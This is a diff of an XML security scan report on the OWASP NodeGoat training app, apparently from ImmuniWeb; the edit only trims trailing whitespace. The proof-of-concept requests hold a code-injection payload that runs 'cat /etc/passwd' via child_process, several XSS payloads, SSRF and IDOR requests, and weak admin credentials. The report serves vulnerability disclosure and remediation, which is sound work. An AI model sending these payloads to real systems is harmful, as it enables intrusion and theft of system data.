@@ -26,7 +26,7 @@ Cookie: connect.sid=s%3ATVNY7sIvAefK3mQqKY55ouSIymVtOlNr.ab4Ev%2FCyiDZODrQZOQL1E
 Upgrade-Insecure-Requests: 1
 
 preTax=preTax%3D2%3B+var+asd+%3D+require%28%27child_process%27%29.execSync%28%27cat+%2Fetc%2Fpasswd%27%29%3B+res.write%28asd%29&roth=0&afterTax=0]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -74,7 +74,7 @@ userName=admin&password=Admin_123&_csrf=]]></PoC>
 		<URL>http://owasp-nodegoat.com:4000/benefits</URL>
 		<Description><![CDATA[The web application does not properly limits access to the "[B]/benefits[/B]" URL, which contains administrative functionality and potentially sensitive information. A remote authenticated attacker (registration is open) can use the vulnerable URL to access administrative functionality and gain potentially sensitive data.
 
-Upon successful exploitation of this vulnerability, an attacker will be able to collect potentially sensitive information or perform further attacks, e.g. elevate privileges in the application using Stored XSS vulnerability (#52577646). 
+Upon successful exploitation of this vulnerability, an attacker will be able to collect potentially sensitive information or perform further attacks, e.g. elevate privileges in the application using Stored XSS vulnerability (#52577646).
 ]]></Description>
 		<PoC><![CDATA[GET http://owasp-nodegoat.com:4000/benefits HTTP/1.1
 Host: owasp-nodegoat.com:4000
@@ -85,7 +85,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: connect.sid=s%3AxXmL6zNLGdvwBD8obMRUPrEg73VNAHXY.QAf7RYmaebIsA1UuU9LgWhyDKdMNZePvrEWfZcP5odE
 Upgrade-Insecure-Requests: 1]]></PoC>
-		<Remediation><![CDATA[Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data. 
+		<Remediation><![CDATA[Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -114,7 +114,7 @@ Cookie: connect.sid=s%3AxXmL6zNLGdvwBD8obMRUPrEg73VNAHXY.QAf7RYmaebIsA1UuU9LgWhy
 Upgrade-Insecure-Requests: 1
 
 firstName=&lastName=&ssn=&dob=&bankAcc=&bankRouting=0198212%23+&address=&_csrf=&submit=]]></PoC>
-		<Remediation><![CDATA[Implement a proper anti-CSRF protection mechanism, which would generate unique random tokens for every form, keep track of these tokens and perform validation of the HTTP request origin by comparing received token from the user with the token generated on the server side. 
+		<Remediation><![CDATA[Implement a proper anti-CSRF protection mechanism, which would generate unique random tokens for every form, keep track of these tokens and perform validation of the HTTP request origin by comparing received token from the user with the token generated on the server side.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -161,7 +161,7 @@ We recommend changing your password policy and reject weak and predictable passw
 		<URL>http://owasp-nodegoat.com:4000/allocations/</URL>
 		<Description><![CDATA[The web application allows uses a numeric identifier to reference objects related to asset information at the "[B]http://owasp-nodegoat.com:4000/allocations/#ID#[/B]" URL, where #ID# stands for a subsequent number. A remote authenticated user (registration is open) can modify the identifier in URL and get unauthorized access to sensitive data of other web application users.]]></Description>
 		<PoC><![CDATA[http://owasp-nodegoat.com:4000/allocations/1]]></PoC>
-		<Remediation><![CDATA[Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data. 
+		<Remediation><![CDATA[Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -256,7 +256,7 @@ Upgrade-Insecure-Requests: 1]]></PoC>
 		<CVSSv3>8.3 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L]</CVSSv3>
 		<Risk>HIGH</Risk>
 		<URL>http://owasp-nodegoat.com:4000/research</URL>
-		<Description><![CDATA[A Server-Side-Request Forgery vulnerability exists due to the application accepts arbitrary URL passed via the "url" HTTP GET parameter to "http://owasp-nodegoat.com:4000/research" and uses it to perform queries. A remote authenticated attacker (registration is open) can abuse this functionality to send requests to arbitrary servers, including servers, located in local network. 
+		<Description><![CDATA[A Server-Side-Request Forgery vulnerability exists due to the application accepts arbitrary URL passed via the "url" HTTP GET parameter to "http://owasp-nodegoat.com:4000/research" and uses it to perform queries. A remote authenticated attacker (registration is open) can abuse this functionality to send requests to arbitrary servers, including servers, located in local network.
 ]]></Description>
 		<PoC><![CDATA[GET http://owasp-nodegoat.com:4000/research?url=https%3A%2F%2Fwww.immuniweb.com%2F&symbol=a HTTP/1.1
 Host: owasp-nodegoat.com:4000
@@ -308,7 +308,7 @@ Content-Length: 131
 Content-Type: application/x-www-form-urlencoded
 
 _csrf=&email=[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]&firstName=1&lastName=1&password=&userName=[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]&verify=]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -330,7 +330,7 @@ Accept: */*
 Accept-Encoding: deflate, gzip
 Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8
 Accept-Language: en-us;q=0.8]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -359,7 +359,7 @@ Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn
 Upgrade-Insecure-Requests: 1
 
 userId=3&benefitStartDate=[PAYLOAD]"><script>alert("ImmuniWeb");</script>[/PAYLOAD]]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -402,7 +402,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8
 Upgrade-Insecure-Requests: 1]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -428,7 +428,7 @@ Content-Length: 103
 Content-Type: application/x-www-form-urlencoded
 
 _csrf=&password=admin1&userName=admin[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 	<Vulnerability>
@@ -457,7 +457,7 @@ Cookie: connect.sid=s%3ADgQ1ifBCLLm5ZR1lQOG6ToRsMQYQX2Hj.6JxsRXgGs0b93zquY%2FWzd
 Upgrade-Insecure-Requests: 1
 
 firstName=&lastName=[PAYLOAD]%22%3E%3Cscript%3Ealert%60ImmuniWeb%60%3B%3C%2Fscript%3E[/PAYLOAD]&ssn=[PAYLOAD]%22%3E%3Cscript%3Ealert%60ImmuniWeb%60%3B%3C%2Fscript%3E[/PAYLOAD]&dob=&bankAcc=&bankRouting=0198212%23&address=&_csrf=&submit=]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 </Vulnerabilities>
